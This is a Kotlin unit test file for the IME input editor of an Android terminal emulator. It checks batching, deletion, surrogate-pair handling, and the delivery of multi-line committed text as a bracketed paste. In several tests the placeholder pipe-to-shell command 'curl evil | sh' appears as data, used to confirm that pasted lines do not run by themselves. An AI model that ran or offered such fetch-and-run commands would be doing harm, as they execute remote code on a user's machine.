/*
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

@file:OptIn(InternalVtfxApi::class)

package com.google.vtfx.input

import com.google.vtfx.core.InternalVtfxApi
import com.google.vtfx.core.KeyModifiers
import com.google.vtfx.core.KeyStroke
import com.google.vtfx.core.TerminalKey
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue
import org.junit.Test

class ImeEditorTest {
    private val sent = mutableListOf<HostInput>()
    private var restarts = 0
    private val editor =
        ImeEditor(
            object : ImeEditor.Listener {
                override fun send(input: HostInput) {
                    sent += input
                }

                override fun restartInput() {
                    restarts++
                }
            }
        )

    private val enter = HostInput.Key(KeyStroke.Special(TerminalKey.Enter))

    private val tab = HostInput.Key(KeyStroke.Special(TerminalKey.Tab))

    private fun text(s: String) = HostInput.Text(s)

    private fun delete(n: Int) = HostInput.Delete(n)

    @Test
    fun composingTextIsNotSent() {
        editor.setComposingText("にほ")
        assertEquals(emptyList<HostInput>(), sent)
        assertEquals("にほ", editor.text)
        assertEquals(0, editor.composingStart)
        assertEquals(2, editor.composingEnd)
    }

    @Test
    fun commitSendsAndKeepsHistory() {
        editor.setComposingText("にほ")
        editor.commitText("日本")
        assertEquals(listOf<HostInput>(text("日本")), sent)
        assertEquals("日本", editor.text)
        assertEquals(-1, editor.composingStart)
    }

    @Test
    fun editsInABatchAreSentOnceAtTheEnd() {
        editor.commitText("Dont")
        sent.clear()
        editor.beginBatchEdit()
        editor.deleteSurroundingText(4, 0)
        editor.commitText("Don't ")
        assertEquals(emptyList<HostInput>(), sent)
        assertFalse(editor.endBatchEdit())
        assertEquals(listOf<HostInput>(delete(1), text("'t ")), sent)
    }

    @Test
    fun nestedBatchesSendAtTheOutermostEnd() {
        editor.beginBatchEdit()
        editor.beginBatchEdit()
        editor.commitText("a")
        assertTrue(editor.endBatchEdit())
        assertEquals(emptyList<HostInput>(), sent)
        assertFalse(editor.endBatchEdit())
        assertEquals(listOf<HostInput>(text("a")), sent)
        assertFalse(editor.endBatchEdit())
    }

    @Test
    fun replaceTextInTheHistorySendsTheDifference() {
        editor.commitText("ok ")
        sent.clear()
        assertTrue(editor.replaceText(2, 3, ". "))
        assertEquals(listOf<HostInput>(delete(1), text(". ")), sent)
    }

    @Test
    fun replaceTextOutsideTheBufferIsRejected() {
        editor.commitText("ok")
        sent.clear()
        assertFalse(editor.replaceText(1, 5, "x"))
        assertFalse(editor.replaceText(-1, 1, "x"))
        assertEquals(emptyList<HostInput>(), sent)
        assertEquals("ok", editor.text)
    }

    @Test
    fun deletingBeyondTheHistorySendsDelForTheRest() {
        editor.commitText("ab")
        sent.clear()
        editor.deleteSurroundingText(5, 0)
        assertEquals(listOf<HostInput>(delete(5)), sent)
        assertEquals("", editor.text)
    }

    @Test
    fun deletionsBeyondTheHistoryComeBeforeNewText() {
        editor.commitText("abc")
        sent.clear()
        editor.beginBatchEdit()
        editor.deleteSurroundingText(5, 0)
        editor.commitText("z")
        editor.deleteSurroundingText(3, 0)
        editor.endBatchEdit()
        // "abc", 2 characters before it, "z", and 2 more.
        assertEquals(listOf<HostInput>(delete(7)), sent)
    }

    @Test
    fun deleteDoesNotSplitASurrogatePair() {
        editor.commitText("a😀")
        sent.clear()
        editor.deleteSurroundingText(1, 0)
        assertEquals(listOf<HostInput>(delete(1)), sent)
        assertEquals("a", editor.text)
    }

    @Test
    fun deleteInCodePointsCountsCodePoints() {
        editor.commitText("a😀b")
        sent.clear()
        editor.deleteSurroundingTextInCodePoints(2, 0)
        assertEquals(listOf<HostInput>(delete(2)), sent)
        assertEquals("a", editor.text)
    }

    @Test
    fun deleteRemovesComposingTextFirst() {
        editor.commitText("a")
        editor.setComposingText("かな")
        sent.clear()
        editor.deleteSurroundingText(1, 0)
        assertEquals(emptyList<HostInput>(), sent)
        assertEquals("aか", editor.text)
    }

    @Test
    fun reconvertingTheHistoryDeletesItUntilCommitted() {
        editor.commitText("漢字")
        sent.clear()
        assertTrue(editor.setComposingRegion(0, 2))
        assertEquals(listOf<HostInput>(delete(2)), sent)
        assertEquals(0, editor.composingStart)
        editor.commitText("感じ")
        assertEquals(listOf<HostInput>(delete(2), text("感じ")), sent)
    }

    @Test
    fun composingRegionMustEndAtTheCursor() {
        editor.commitText("abc")
        assertFalse(editor.setComposingRegion(0, 2))
        assertFalse(editor.setComposingRegion(0, 4))
        assertTrue(editor.setComposingRegion(2, 3))
        assertEquals(2, editor.composingStart)
    }

    @Test
    fun emptyComposingRegionFinishesTheComposition() {
        editor.setComposingText("a")
        assertTrue(editor.setComposingRegion(1, 1))
        assertEquals(listOf<HostInput>(text("a")), sent)
    }

    @Test
    fun selectionMustEndAtTheCursor() {
        editor.commitText("abc")
        assertTrue(editor.setSelection(3, 3))
        assertFalse(editor.setSelection(1, 1))
        assertFalse(editor.setSelection(0, 2))
        assertTrue(editor.setSelection(1, 3))
        assertEquals(1, editor.selectionStart)
        assertEquals("bc", editor.selectedText)
        assertEquals("a", editor.textBeforeCursor(10))
    }

    @Test
    fun commitReplacesTheSelection() {
        // Gboard's double-space period on the emulator (docs/decisions/0008).
        editor.commitText("ok ")
        sent.clear()
        editor.finishComposingText()
        assertTrue(editor.setSelection(2, 3))
        editor.commitText(". ")
        assertEquals(listOf<HostInput>(delete(1), text(". ")), sent)
        assertEquals("ok. ", editor.text)
        assertEquals(null, editor.selectedText)
    }

    @Test
    fun composingTextReplacesTheSelection() {
        editor.commitText("abc")
        sent.clear()
        editor.setSelection(1, 3)
        editor.setComposingText("x")
        assertEquals(listOf<HostInput>(delete(2)), sent)
        assertEquals("ax", editor.text)
        assertEquals(1, editor.composingStart)
    }

    @Test
    fun otherEditsCollapseTheSelectionFirst() {
        editor.commitText("abc")
        sent.clear()
        editor.setSelection(0, 3)
        editor.deleteSurroundingText(1, 0)
        assertEquals(listOf<HostInput>(delete(1)), sent)
        assertEquals("ab", editor.text)
        assertEquals(editor.cursor, editor.selectionStart)
    }

    @Test
    fun selectionIsRejectedDuringComposition() {
        editor.commitText("ab")
        editor.setComposingText("か")
        assertFalse(editor.setSelection(0, 3))
    }

    @Test
    fun committedNewlineIsSentAsEnterAndResets() {
        editor.commitText("ls")
        editor.commitText("\n")
        assertEquals(listOf<HostInput>(text("ls"), enter), sent)
        assertEquals(1, restarts)
        assertEquals("", editor.text)
    }

    @Test
    fun aNewlineCommittedInABatchEditIsSentAndResetsAtOnce() {
        editor.commitText("ls")
        sent.clear()
        editor.beginBatchEdit()
        editor.commitText("\n")
        assertEquals(listOf<HostInput>(enter), sent)
        assertEquals("", editor.text)
        // The deletion cannot take back the Enter: it is BS on the new line.
        editor.deleteSurroundingText(1, 0)
        assertEquals(0, restarts)
        assertFalse(editor.endBatchEdit())
        assertEquals(listOf(enter, delete(1)), sent)
        assertEquals(1, restarts)
    }

    @Test
    fun anHtCommittedInABatchEditIsSentAndResetsAtOnce() {
        editor.beginBatchEdit()
        editor.commitText("ab")
        editor.commitText("\t")
        assertEquals(listOf<HostInput>(text("ab\t")), sent)
        assertEquals("", editor.text)
        assertFalse(editor.replaceText(0, 1, "x"))
        editor.commitText("cd")
        assertFalse(editor.endBatchEdit())
        assertEquals(listOf<HostInput>(text("ab\t"), text("cd")), sent)
        // What was committed since the reset is dropped by the restart (section 5.2).
        assertEquals("", editor.text)
        assertEquals(1, restarts)
    }

    @Test
    fun textAroundAnHtCommittedInABatchEditIsSentWithItAtOnce() {
        editor.beginBatchEdit()
        editor.commitText("a\tb")
        assertEquals(listOf<HostInput>(text("a\tb")), sent)
        assertEquals("", editor.text)
        assertFalse(editor.endBatchEdit())
        assertEquals(listOf<HostInput>(text("a\tb")), sent)
    }

    @Test
    fun anHtReplacingTextInABatchEditIsSentAndResetsAtOnce() {
        editor.commitText("cd Doc")
        sent.clear()
        editor.beginBatchEdit()
        editor.replaceText(3, 6, "Doc\t")
        assertEquals(listOf<HostInput>(text("\t")), sent)
        assertEquals("", editor.text)
        assertFalse(editor.endBatchEdit())
    }

    @Test
    fun characterKeysOfHtAndLineBreaksInABatchEditAreSentAtOnce() {
        editor.beginBatchEdit()
        editor.commitText("a")
        editor.onKeyDown(KeyStroke.Character('\t'.code))
        editor.commitText("b")
        editor.onKeyDown(KeyStroke.Character('\r'.code))
        assertEquals(listOf(text("a"), tab, text("b"), enter), sent)
        assertEquals("", editor.text)
        assertFalse(editor.endBatchEdit())
        assertEquals(1, restarts)
    }

    @Test
    fun characterKeysOfHtAndLineBreaksAreTheTabAndEnterKeys() {
        // With modifiers, the key encoding would drop them as control characters.
        val ctrl = KeyModifiers.of(ctrl = true)
        val alt = KeyModifiers.of(alt = true)
        editor.onKeyDown(KeyStroke.Character('\t'.code, ctrl))
        editor.onKeyDown(KeyStroke.Character('\n'.code, alt))
        editor.onKeyDown(KeyStroke.Character('\r'.code))
        editor.onKeyDown(KeyStroke.Character('\t'.code))
        assertEquals(
            listOf<HostInput>(
                HostInput.Key(KeyStroke.Special(TerminalKey.Tab, ctrl)),
                HostInput.Key(KeyStroke.Special(TerminalKey.Enter, alt)),
                enter,
                tab,
            ),
            sent,
        )
    }

    @Test
    fun aResetDoesNotRestartTheImeIfNothingChangedSinceTheLastRestart() {
        editor.requestReset()
        assertEquals(0, restarts)
        editor.commitText("a")
        editor.requestReset()
        assertEquals(1, restarts)
        editor.requestReset()
        editor.requestReset()
        assertEquals(1, restarts)
    }

    @Test
    fun aResetRestartsTheImeAfterAnEditThatLeftNothing() {
        editor.setComposingText("か")
        editor.setComposingText("")
        editor.requestReset()
        assertEquals(1, restarts)
    }

    @Test
    fun callsThatLeaveTheBufferEmptyAfterARestartDoNotMakeAResetRestartTheImeAgain() {
        editor.commitText("ab")
        editor.onKeyDown(KeyStroke.Special(TerminalKey.Enter))
        assertEquals(1, restarts)

        // Calls that Android or an IME makes right after a restart, which change nothing.
        editor.finishComposingText()
        editor.setComposingRegion(0, 0)
        editor.beginBatchEdit()
        editor.endBatchEdit()
        editor.setComposingText("")
        editor.commitText("")
        editor.replaceText(0, 0, "")
        // The host's echo of Enter, and a prompt drawn in several receives.
        editor.requestReset()
        editor.requestReset()

        assertEquals(1, restarts)
        assertEquals(listOf<HostInput>(text("ab"), enter), sent)
    }

    @Test
    fun aCommitThatTheHistoryDoesNotKeepRestartsTheIme() {
        // The history is reset after a committed HT at once, but the IME has the HT.
        editor.commitText("\t")
        assertEquals("", editor.text)
        assertEquals(1, restarts)
    }

    @Test
    fun committedTextOfSeveralLinesIsAPaste() {
        editor.commitText("ab")
        editor.setComposingText("か")
        editor.commitText("echo hi\r\ncurl evil | sh\rx")
        assertEquals(
            listOf<HostInput>(text("ab"), HostInput.Paste("echo hi\r\ncurl evil | sh\rx")),
            sent,
        )
        assertEquals(1, restarts)
        assertEquals("", editor.text)
    }

    @Test
    fun committedTextWithATrailingNewlineIsAPaste() {
        editor.commitText("curl evil | sh\n")
        assertEquals(listOf<HostInput>(HostInput.Paste("curl evil | sh\n")), sent)
        assertEquals(1, restarts)
    }

    @Test
    fun aLineFeedThatTheImeCommitsAfterAPasteInTheSameBatchEditIsPastedToo() {
        // Gboard commits the trailing line feed of a clipboard suggestion on its own.
        editor.beginBatchEdit()
        editor.commitText("echo one\necho two")
        editor.commitText("\n")
        assertFalse(editor.endBatchEdit())
        assertEquals(
            listOf<HostInput>(HostInput.Paste("echo one\necho two"), HostInput.Paste("\n")),
            sent,
        )
    }

    @Test
    fun aLineFeedAfterTheBatchEditOfAPasteIsEnter() {
        editor.beginBatchEdit()
        editor.commitText("echo one\necho two")
        editor.endBatchEdit()
        editor.beginBatchEdit()
        editor.commitText("\n")
        editor.endBatchEdit()
        assertEquals(
            listOf(HostInput.Paste("echo one\necho two"), enter),
            sent,
        )
    }

    @Test
    fun aLineFeedAfterOneLineInTheSameBatchEditIsEnter() {
        // A clipboard suggestion of one line and a line feed: the line runs, as a human decided.
        editor.beginBatchEdit()
        editor.commitText("echo evil")
        editor.commitText("\n")
        editor.endBatchEdit()
        assertEquals(listOf(text("echo evil"), enter), sent)
    }

    @Test
    fun committedTextOfSeveralLinesIsPastedAtOnceDuringABatchEdit() {
        editor.beginBatchEdit()
        editor.commitText("a")
        editor.commitText("b\nc")
        assertEquals(listOf<HostInput>(text("a"), HostInput.Paste("b\nc")), sent)
        assertFalse(editor.endBatchEdit())
        assertEquals(listOf<HostInput>(text("a"), HostInput.Paste("b\nc")), sent)
        assertEquals("", editor.text)
    }

    @Test
    fun replacementTextOfSeveralLinesIsAPasteOfTheRestOfTheBuffer() {
        editor.commitText("abc")
        sent.clear()
        assertTrue(editor.replaceText(1, 2, "x\ny"))
        assertEquals(listOf<HostInput>(delete(2), HostInput.Paste("x\nyc")), sent)
        assertEquals("", editor.text)
    }

    @Test
    fun aLineFeedReplacingTextBeforeTheEndOfTheBufferIsAPasteOfTheRest() {
        editor.commitText("echo hi")
        sent.clear()
        // "echo" must not run with "hi" typed on the next line.
        assertTrue(editor.replaceText(4, 5, "\n"))
        assertEquals(listOf<HostInput>(delete(3), HostInput.Paste("\nhi")), sent)
        assertEquals("", editor.text)
        assertEquals(1, restarts)
    }

    @Test
    fun aLineFeedReplacingTheEndOfTheBufferIsEnter() {
        editor.commitText("echo hi")
        sent.clear()
        assertTrue(editor.replaceText(4, 7, "\n"))
        assertEquals(listOf<HostInput>(delete(3), enter), sent)
        assertEquals("", editor.text)
    }

    @Test
    fun aLineFeedReplacingTextAfterAPasteInTheSameBatchEditIsPastedToo() {
        editor.beginBatchEdit()
        editor.replaceText(0, 0, "line1\nline2")
        editor.replaceText(0, 0, "\n")
        assertFalse(editor.endBatchEdit())
        assertEquals(
            listOf<HostInput>(HostInput.Paste("line1\nline2"), HostInput.Paste("\n")),
            sent,
        )
    }

    @Test
    fun aReplacementCommitsTheComposingTextOfSeveralLinesAsAPaste() {
        editor.commitText("ab")
        editor.setComposingText("x\ny")
        sent.clear()
        // The range ends before the composing text, whose lines the replacement commits.
        assertTrue(editor.replaceText(1, 2, "c"))
        assertEquals(listOf<HostInput>(delete(1), HostInput.Paste("cx\ny")), sent)
        assertEquals("", editor.text)
    }

    @Test
    fun aReplacementInTheComposingTextCommitsItsLinesBeforeTheRangeAsAPaste() {
        editor.commitText("ab")
        editor.setComposingText("x\nyz")
        sent.clear()
        assertTrue(editor.replaceText(5, 6, "Z"))
        assertEquals(listOf<HostInput>(HostInput.Paste("x\nyZ")), sent)
        assertEquals("", editor.text)
    }

    @Test
    fun composingTextOfSeveralLinesIsPastedWhenFinished() {
        editor.commitText("ab")
        editor.setComposingText("echo safe\ncurl evil | sh\n")
        assertEquals(listOf<HostInput>(text("ab")), sent)
        editor.finishComposingText()
        assertEquals(
            listOf<HostInput>(text("ab"), HostInput.Paste("echo safe\ncurl evil | sh\n")),
            sent,
        )
        assertEquals("", editor.text)
        assertEquals(1, restarts)
    }

    @Test
    fun composingTextOfSeveralLinesIsPastedWhenAnyCallCommitsIt() {
        val commits =
            listOf<Pair<String, (ImeEditor) -> Unit>>(
                "setComposingRegion(0, 0)" to { it.setComposingRegion(0, 0) },
                "onKeyDown(q)" to { it.onKeyDown(KeyStroke.Character('q'.code)) },
                "onKeyDown(Left)" to { it.onKeyDown(KeyStroke.Special(TerminalKey.Left)) },
                "closeConnection" to { it.closeConnection() },
                "typeText" to { it.typeText("t") },
                "paste" to { it.paste("p") },
                "sendPendingInput" to { it.sendPendingInput() },
            )
        for ((name, call) in commits) {
            val inputs = mutableListOf<HostInput>()
            val editor =
                ImeEditor(
                    object : ImeEditor.Listener {
                        override fun send(input: HostInput) {
                            inputs += input
                        }

                        override fun restartInput() {}
                    }
                )
            editor.setComposingText("a\nb")
            call(editor)
            assertEquals(HostInput.Paste("a\nb"), inputs.firstOrNull(), name)
            assertTrue(inputs.drop(1).none { it == enter }, "$name: $inputs")
        }
    }

    @Test
    fun composingTextOfSeveralLinesIsPastedWhenTheHistoryLimitCommitsIt() {
        val small =
            ImeEditor(
                object : ImeEditor.Listener {
                    override fun send(input: HostInput) {
                        sent += input
                    }

                    override fun restartInput() {}
                },
                maxHistoryLength = 3,
            )
        small.beginBatchEdit()
        small.commitText("abc")
        small.setComposingText("dx\ny")
        // Commits "d", which takes the history over its limit.
        small.setComposingRegion(4, 7)
        assertEquals(listOf<HostInput>(text("abcd"), HostInput.Paste("x\ny")), sent)
        assertEquals("", small.text)
    }

    @Test
    fun aComposingRegionAfterALineBreakPastesTheComposingTextBeforeIt() {
        editor.setComposingText("a\nbc")
        assertTrue(editor.setComposingRegion(3, 4))
        assertEquals(listOf<HostInput>(HostInput.Paste("a\nb")), sent)
        assertEquals("c", editor.text)
        assertEquals(0, editor.composingStart)
    }

    @Test
    fun composingTextOfALineFeedAloneIsEnterWhenFinished() {
        editor.commitText("ls")
        editor.setComposingText("\n")
        editor.finishComposingText()
        assertEquals(listOf<HostInput>(text("ls"), enter), sent)
    }

    @Test
    fun composingTextOfALineFeedAloneAfterAPasteInTheSameBatchEditIsPastedToo() {
        editor.beginBatchEdit()
        editor.commitText("echo one\necho two")
        editor.setComposingText("\n")
        editor.finishComposingText()
        editor.endBatchEdit()
        assertEquals(
            listOf<HostInput>(HostInput.Paste("echo one\necho two"), HostInput.Paste("\n")),
            sent,
        )
    }

    @Test
    fun typedTextIsNotKeptInTheHistory() {
        editor.commitText("ls ")
        editor.typeText("hunter2")
        assertEquals(listOf<HostInput>(text("ls "), text("hunter2")), sent)
        assertEquals("", editor.text)
        assertEquals("", editor.textBeforeCursor(100))
    }

    @Test
    fun typedTextDoesNotRestartTheImeThatSawNothing() {
        editor.typeText("a")
        assertEquals(0, restarts)
    }

    @Test
    fun typedTextIsSentAtOnceDuringABatchEdit() {
        editor.beginBatchEdit()
        editor.typeText("ls")
        assertEquals(listOf<HostInput>(text("ls")), sent)
        assertFalse(editor.endBatchEdit())
        assertEquals(listOf<HostInput>(text("ls")), sent)
    }

    @Test
    fun typedTextOfSeveralLinesIsSentAsEnters() {
        editor.setComposingText("か")
        editor.typeText("ls\r\nx\ny")
        assertEquals(
            listOf<HostInput>(text("か"), text("ls"), enter, text("x"), enter, text("y")),
            sent,
        )
        assertEquals(1, restarts)
        assertEquals("", editor.text)
    }

    @Test
    fun controlsThatAreNotSentAreNotKeptInTheHistory() {
        editor.commitText("a\u001bb\u007f\u009bc")
        assertEquals(listOf<HostInput>(text("abc")), sent)
        assertEquals("abc", editor.text)
        // Only the characters that reached the host are deleted.
        sent.clear()
        editor.replaceText(0, 0, "X")
        assertEquals(listOf<HostInput>(delete(3), text("Xabc")), sent)
    }

    @Test
    fun committedTabIsSentAndResetsLikeTheTabKey() {
        editor.commitText("cd Doc\t")
        assertEquals(listOf<HostInput>(text("cd Doc\t")), sent)
        // The shell may have completed the word, so the history no longer predicts the line.
        assertEquals("", editor.text)
        assertEquals(1, restarts)
        assertFalse(editor.setComposingRegion(3, 7))
        assertEquals(listOf<HostInput>(text("cd Doc\t")), sent)
    }

    @Test
    fun controlsAreRemovedFromTheComposingText() {
        editor.setComposingText("か\u0007")
        assertEquals("か", editor.composingText)
        editor.finishComposingText()
        assertEquals(listOf<HostInput>(text("か")), sent)
    }

    @Test
    fun controlsAreRemovedFromReplacements() {
        editor.commitText("ab")
        sent.clear()
        editor.replaceText(1, 2, "\u001bc")
        assertEquals(listOf<HostInput>(delete(1), text("c")), sent)
        assertEquals("ac", editor.text)
    }

    @Test
    fun backspaceAfterACommittedControlDeletesTheSentCharacter() {
        editor.commitText("ab\u001b")
        editor.onKeyDown(KeyStroke.Special(TerminalKey.Backspace))
        assertEquals("a", editor.text)
    }

    @Test
    fun enterKeyFinishesTheCompositionThenResets() {
        editor.setComposingText("한")
        editor.onKeyDown(KeyStroke.Special(TerminalKey.Enter))
        assertEquals(listOf<HostInput>(text("한"), enter), sent)
        assertEquals(1, restarts)
    }

    @Test
    fun performEditorActionIsEnter() {
        editor.commitText("a")
        editor.performEditorAction()
        assertEquals(listOf<HostInput>(text("a"), enter), sent)
        assertEquals(1, restarts)
    }

    @Test
    fun backspaceKeySendsDelAndShortensTheHistoryWithoutReset() {
        editor.commitText("あい")
        sent.clear()
        editor.onKeyDown(KeyStroke.Special(TerminalKey.Backspace))
        assertEquals(
            listOf<HostInput>(HostInput.Key(KeyStroke.Special(TerminalKey.Backspace))),
            sent,
        )
        assertEquals("あ", editor.text)
        assertEquals(0, restarts)
        // The history matches the host, so a later replacement deletes only what remains.
        sent.clear()
        editor.replaceText(0, 1, "x")
        assertEquals(listOf<HostInput>(delete(1), text("x")), sent)
    }

    @Test
    fun characterKeyIsCommittedAfterTheComposingTextAndResets() {
        editor.setComposingText("か")
        editor.onKeyDown(KeyStroke.Character('x'.code))
        assertEquals(listOf<HostInput>(text("かx")), sent)
        // The IME still has the composing text, which the host received (docs/decisions/0054).
        assertEquals("", editor.text)
        assertEquals(1, restarts)
    }

    @Test
    fun otherKeysSendTheCompositionFirstAndReset() {
        val left = KeyStroke.Special(TerminalKey.Left)
        val ctrlC = KeyStroke.Character('c'.code, KeyModifiers.of(ctrl = true))
        editor.setComposingText("あ")
        editor.onKeyDown(left)
        editor.onKeyDown(ctrlC)
        assertEquals(listOf<HostInput>(text("あ"), HostInput.Key(left), HostInput.Key(ctrlC)), sent)
        assertEquals(2, restarts)
    }

    @Test
    fun pasteFollowsTheCompositionAndResets() {
        editor.setComposingText("日本")
        editor.paste("x\n")
        assertEquals(listOf(text("日本"), HostInput.Paste("x\n")), sent)
        assertEquals(1, restarts)
        assertEquals("", editor.text)
    }

    @Test
    fun pasteInABatchIsSentAfterTheEditsNotSentYet() {
        editor.commitText("ab")
        sent.clear()
        editor.beginBatchEdit()
        editor.deleteSurroundingText(1, 0)
        editor.setComposingText("か")
        editor.paste("p")
        assertEquals(listOf(delete(1), text("か"), HostInput.Paste("p")), sent)
        // The reset waits for the end of the batch, and nothing else is sent then.
        assertEquals(0, restarts)
        assertFalse(editor.endBatchEdit())
        assertEquals(listOf(delete(1), text("か"), HostInput.Paste("p")), sent)
        assertEquals(1, restarts)
    }

    @Test
    fun pendingInputIsSentDuringABatchAndResetsAtItsEnd() {
        editor.commitText("ab")
        sent.clear()
        editor.beginBatchEdit()
        editor.deleteSurroundingText(1, 0)
        editor.setComposingText("か")
        editor.sendPendingInput()
        assertEquals(listOf(delete(1), text("か")), sent)
        // The history is reset at once, and only the restart waits.
        assertEquals("", editor.text)
        assertEquals(0, restarts)
        assertFalse(editor.endBatchEdit())
        assertEquals(listOf(delete(1), text("か")), sent)
        assertEquals("", editor.text)
        assertEquals(1, restarts)
    }

    @Test
    fun pendingInputWithoutComposingTextResets() {
        editor.commitText("ab")
        editor.sendPendingInput()
        assertEquals(listOf<HostInput>(text("ab")), sent)
        // The IME could otherwise correct the text later, after the app armed its modifiers.
        assertEquals("", editor.text)
        assertEquals(1, restarts)
        editor.sendPendingInput()
        assertEquals(1, restarts)
    }

    @Test
    fun theRestartWaitsForTheCompositionToFinish() {
        editor.commitText("a")
        editor.setComposingText("か")
        editor.requestReset()
        assertEquals(0, restarts)
        // The history is reset at once; the composing text stays, since the IME has it.
        assertEquals("か", editor.text)
        editor.finishComposingText()
        assertEquals(1, restarts)
        assertEquals("", editor.text)
    }

    @Test
    fun aPasteInABatchResetsForTheRestOfTheBatch() {
        editor.commitText("ab")
        editor.beginBatchEdit()
        editor.paste("XY")
        assertFalse(editor.replaceText(0, 2, "cd"))
        assertFalse(editor.endBatchEdit())
        assertEquals(listOf(text("ab"), HostInput.Paste("XY")), sent)
    }

    @Test
    fun aKeyInABatchResetsForTheRestOfTheBatch() {
        editor.commitText("ab")
        editor.beginBatchEdit()
        editor.onKeyDown(KeyStroke.Special(TerminalKey.Left))
        assertFalse(editor.replaceText(0, 2, "cd"))
        assertFalse(editor.endBatchEdit())
        assertEquals(
            listOf<HostInput>(text("ab"), HostInput.Key(KeyStroke.Special(TerminalKey.Left))),
            sent,
        )
    }

    @Test
    fun aResetInABatchSendsTheEditsMadeBeforeIt() {
        editor.commitText("ab")
        editor.beginBatchEdit()
        editor.replaceText(1, 2, "c")
        editor.requestReset()
        assertEquals(listOf(text("ab"), delete(1), text("c")), sent)
        assertEquals("", editor.text)
        editor.deleteSurroundingText(1, 0)
        assertFalse(editor.endBatchEdit())
        // The deletion reaches before the empty history, as BS.
        assertEquals(listOf(text("ab"), delete(1), text("c"), delete(1)), sent)
        assertEquals(1, restarts)
    }

    @Test
    fun aBackspaceThatCommitsTheComposingTextResets() {
        editor.setComposingText("か")
        editor.onKeyDown(KeyStroke.Special(TerminalKey.Backspace))
        assertEquals(
            listOf(text("か"), HostInput.Key(KeyStroke.Special(TerminalKey.Backspace))),
            sent,
        )
        assertEquals("", editor.text)
        assertEquals(1, restarts)
    }

    @Test
    fun aCharacterKeyWithoutComposingTextKeepsTheHistory() {
        editor.commitText("a")
        editor.onKeyDown(KeyStroke.Character('b'.code))
        assertEquals("ab", editor.text)
        assertEquals(0, restarts)
    }

    @Test
    fun resetInABatchHappensAtTheEnd() {
        editor.beginBatchEdit()
        editor.commitText("a")
        editor.requestReset()
        assertEquals(0, restarts)
        editor.endBatchEdit()
        assertEquals(listOf<HostInput>(text("a")), sent)
        assertEquals(1, restarts)
    }

    @Test
    fun historyLongerThanTheLimitResets() {
        val small =
            ImeEditor(
                object : ImeEditor.Listener {
                    override fun send(input: HostInput) {}

                    override fun restartInput() {
                        restarts++
                    }
                },
                maxHistoryLength = 3,
            )
        small.commitText("abc")
        assertEquals(0, restarts)
        small.commitText("d")
        assertEquals(1, restarts)
        assertEquals("", small.text)
    }

    @Test
    fun closeConnectionFinishesTheComposition() {
        editor.beginBatchEdit()
        editor.setComposingText("か")
        editor.closeConnection()
        assertEquals(listOf<HostInput>(text("か")), sent)
    }

    @Test
    fun textBeforeCursorDoesNotSplitASurrogatePair() {
        editor.commitText("a😀")
        assertEquals("", editor.textBeforeCursor(1))
        assertEquals("😀", editor.textBeforeCursor(2))
        assertEquals("a😀", editor.textBeforeCursor(100))
    }

    @Test
    fun halvesOfAPairInTheHistoryAndTheComposingTextAreOneCharacter() {
        // The IME sees the edit buffer, where they pair up, so its edits do not split them.
        editor.commitText("\ud83d")
        editor.setComposingText("\ude00")
        sent.clear()
        assertEquals("", editor.textBeforeCursor(1))
        assertFalse(editor.setComposingRegion(1, 2))
        assertFalse(editor.replaceText(1, 2, "x"))
        // Deleting the character deletes the U+FFFD that the host got for the committed half.
        editor.deleteSurroundingText(1, 0)
        assertEquals(listOf<HostInput>(delete(1)), sent)
        assertEquals("", editor.text)
    }

    @Test
    fun halvesOfAPairInTheHistoryAndTheComposingTextAreSentWholeWhenCommitted() {
        editor.commitText("\ud83d")
        editor.setComposingText("\ude00")
        sent.clear()
        editor.finishComposingText()
        assertEquals(listOf(delete(1), text("\ud83d\ude00")), sent)
    }
}
